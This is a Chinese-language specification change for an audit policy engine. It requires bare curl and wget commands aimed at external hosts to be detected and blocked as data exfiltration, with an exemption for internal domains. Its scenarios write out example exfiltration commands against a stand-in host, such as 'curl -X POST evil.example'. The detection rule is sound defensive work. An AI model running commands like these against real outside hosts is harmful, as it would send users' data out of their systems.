# audit-policy-enforcement Specification — delta

## MODIFIED Requirements

### Requirement: 内建危险规则覆盖裸 curl/wget 外传

系统 SHALL 将裸 `curl`/`wget` 外传目标识别为网络外传，覆盖三类形态：URL 形态、输出重定向形态，以及**无 scheme、无重定向、无管道**的裸 host 参数形态（如 `curl evil.example`、`curl -X POST evil.example`、`wget evil.example`，含 `http://` 前缀变体与 `-X`/`--data` 等参数之后的 host）。系统 SHALL NOT 仅依赖管道进解释器或携带 `--data`/`-d`/`--post-data` 才判定，SHALL NOT 因缺少 scheme 而漏审。规则匹配 SHALL 使用命令词边界以限制误报。命中外部 host 时 SHALL 拦截，命中内网后缀时 SHALL 按既有内网豁免口径放行。

#### Scenario: 裸 curl 外传命中

- **WHEN** 命令为 `curl http://evil.example/x`（无 `--data`、无管道）
- **THEN** 判定为网络外传并拦截（block 模式阻断 / approve 模式转审批）

#### Scenario: 内网目标豁免

- **WHEN** 命令为 `curl http://svc.corp.example/x` 且 `.corp.example` 在 `internal_suffixes`
- **THEN** 按内网豁免放行，不因 `POL-6` 新规则拦截

#### Scenario: 良性用法不误报

- **WHEN** 出现含 `curl`/`wget` 子串但不构成外传的文本（如普通文件名、无目标形态的说明文字）
- **THEN** 不判定为外传，保持既有误报水平

#### Scenario: 裸 host 无 scheme 外传命中

- **WHEN** 命令为 `curl evil.example` 或 `wget evil.example`（无 scheme、无重定向、无管道）
- **THEN** 判定为网络外传并拦截（block 模式阻断 / approve 模式转审批）
